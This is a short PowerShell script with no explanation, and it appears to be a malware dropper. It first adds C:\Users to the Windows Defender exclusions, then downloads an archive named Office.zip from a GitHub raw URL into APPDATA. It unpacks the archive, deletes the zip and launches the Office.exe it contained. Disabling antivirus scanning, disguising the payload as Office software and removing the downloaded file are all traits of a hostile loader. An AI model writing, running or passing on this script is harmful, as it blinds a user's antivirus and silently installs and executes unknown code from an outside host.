Add-MpPreference -ExclusionPath C:\Users

$url = "https://raw.githubusercontent.com/timepassusername1/Gdrive/refs/heads/main/Office.zip"

$output = "$env:APPDATA/Office.zip"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Sleep -Milliseconds 2000

Expand-Archive -Path "$env:APPDATA/Office.zip" -DestinationPath "$env:APPDATA/"

Start-Sleep -Milliseconds 2000

Remove-Item -Path "$env:APPDATA/Office.zip" -Recurse

Start-Process -FilePath "$env:APPDATA/Office.exe"